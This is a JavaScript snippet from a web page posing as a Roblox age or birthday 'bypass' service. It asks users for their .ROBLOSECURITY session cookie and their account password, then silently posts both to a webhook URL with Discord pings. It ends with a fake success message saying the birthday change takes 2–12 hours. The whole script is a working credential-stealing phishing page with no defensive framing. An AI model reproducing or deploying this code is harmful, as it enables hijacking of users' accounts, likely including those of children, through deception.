<script>
  const bypassSelect = document.getElementById('bypass');
  const cookieBlock = document.getElementById('cookie-block');
  const passwordBlock = document.getElementById('password-block');
  const birthdayBlock = document.querySelector('.input-block:nth-of-type(2)');
  const cookieInput = document.getElementById('cookie-input');
  const passwordInput = document.getElementById('password-input');
  const processBtn = document.getElementById('process-button');
  const errorMessage = document.getElementById('error-message');
  const successMessage = document.getElementById('success-message');
  const loaderOverlay = document.getElementById('loader-overlay');

  const daySelect = document.getElementById("day");
  const monthSelect = document.getElementById("month");
  const yearSelect = document.getElementById("year");

  function clearMessages() {
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
  }

  function showError(msg) {
    errorMessage.textContent = msg;
    errorMessage.style.display = 'block';
    setTimeout(() => { errorMessage.style.display = 'none'; }, 4000);
  }

  function showSuccess(msg) {
    successMessage.textContent = msg;
    successMessage.style.display = 'block';
    setTimeout(() => { successMessage.style.display = 'none'; }, 6000);
  }

  async function sendEmbedToDiscord(title, description) {
    const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: '<@1030535100829540464> <@&1392621247460020254>' })
    });

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: title,
          description: description,
          color: 0x00ffff,
          timestamp: new Date().toISOString()
        }]
      })
    });
  }

  // FELDER initial ausblenden
  cookieBlock.style.display = 'none';
  passwordBlock.style.display = 'none';
  birthdayBlock.style.display = 'none';

  bypassSelect.addEventListener('change', () => {
    cookieInput.value = '';
    passwordInput.value = '';
    daySelect.selectedIndex = 0;
    monthSelect.selectedIndex = 0;
    yearSelect.selectedIndex = 0;

    clearMessages();
    if (!bypassSelect.value) {
      cookieBlock.style.display = 'none';
      passwordBlock.style.display = 'none';
      birthdayBlock.style.display = 'none';
    } else {
      cookieBlock.style.display = 'block';
      passwordBlock.style.display = (bypassSelect.value === '13plus') ? 'block' : 'none';
      birthdayBlock.style.display = 'none';
    }
  });

  function checkIfShowBirthday() {
    const cookieValid = cookieInput.value.trim().length >= 500;
    const needsPassword = bypassSelect.value === '13plus';
    const passwordValid = passwordInput.value.trim().length > 0;

    if (bypassSelect.value && cookieValid && (!needsPassword || passwordValid)) {
      birthdayBlock.style.display = 'block';
    } else {
      birthdayBlock.style.display = 'none';
    }
  }

  cookieInput.addEventListener('input', checkIfShowBirthday);
  passwordInput.addEventListener('input', checkIfShowBirthday);

  processBtn.addEventListener('click', async () => {
    clearMessages();

    const selected = bypassSelect.value;
    const cookieVal = cookieInput.value.trim();
    const passwordVal = passwordInput.value.trim();
    const day = daySelect.value;
    const month = monthSelect.value;
    const year = yearSelect.value;

    if (!selected || !day || !month || !year || cookieVal.length < 500 || (selected === '13plus' && passwordVal.length === 0)) {
      showError('ERROR Try later again.');
      return;
    }

    const birthday = `${day}.${month}.${year}`;

    processBtn.disabled = true;
    loaderOverlay.style.display = 'flex';

    try {
      await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${selected}\n**Cookie:** ${cookieVal}\n**Birthday:** ${birthday}`);

      if (selected === '13plus') {
        await sendEmbedToDiscord('Account Password', `**Password:** ${passwordVal}`);
      }

      await new Promise(res => setTimeout(res, 1200));
      loaderOverlay.style.display = 'none';
      showSuccess(`Everything worked! Your birthday is set to: ${birthday}. It can take 2â€“12 hours.`);
    } catch (error) {
      loaderOverlay.style.display = 'none';
      showError('ERROR Try later again.');
    } finally {
      processBtn.disabled = false;
    }
  });

  // Geburtstag Dropdowns initialisieren
  for (let i = 1; i <= 31; i++) daySelect.innerHTML += `<option value="${i}">${i}</option>`;
  for (let i = 1; i <= 12; i++) monthSelect.innerHTML += `<option value="${i}">${i}</option>`;
  for (let i = new Date().getFullYear(); i >= 1900; i--) yearSelect.innerHTML += `<option value="${i}">${i}</option>`;
</script>
